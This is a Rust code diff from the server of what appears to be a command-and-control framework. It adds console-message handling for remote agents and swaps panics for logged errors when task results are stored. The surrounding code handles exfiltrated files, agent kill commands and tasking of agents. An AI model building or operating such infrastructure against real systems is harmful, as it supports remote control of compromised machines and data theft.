@@ -4,6 +4,7 @@ use crate::{
     agents::{extract_agent_id, handle_kill_command},
     app_state::AppState,
     exfil::handle_exfiltrated_file,
+    logging::log_error_async,
     net::serialise_tasks_for_agent,
 };
 use axum::{
@@ -100,23 +101,43 @@ pub async fn handle_agent_post(
             handle_exfiltrated_file(&mut task).await;
         }
 
+        // If we have console messages, we need to explicitly put these in as a new task; although it isn't
+        // a task strictly speaking, not doing so breaks the current model
+        if task.command == Command::ConsoleMessages {
+            let uid = extract_agent_id(&headers);
+            let id = state
+                .db_pool
+                .add_task_for_agent_by_id(&uid, Command::ConsoleMessages, None)
+                .await
+                .expect("Could not insert new task for incoming Console Messages");
+
+            // Overwrite the task ID from 1 to the new one
+            task.id = id;
+        }
+
         //
         // Command::AgentsFirstSessionBeacon was not present, so continue to
         //
 
-        state
-            .db_pool
-            .mark_task_completed(&task)
-            .await
-            .expect("Failed to complete task in db.");
+        if let Err(e) = state.db_pool.mark_task_completed(&task).await {
+            {
+                log_error_async(&format!(
+                    "Failed to complete task in db where task ID = {}. {e}",
+                    task.id
+                ))
+                .await;
+            }
+        }
 
         // Get a copy of the agent
         let agent_id = extract_agent_id(&headers);
-        state
-            .db_pool
-            .add_completed_task(&task, &agent_id)
+        if let Err(e) = state.db_pool.add_completed_task(&task, &agent_id).await {
+            log_error_async(&format!(
+                "Failed to add task results to completed table where task ID = {}. {e}",
+                task.id
+            ))
             .await
-            .expect("Failed to add task results to completed table");
+        }
     }
 
     //
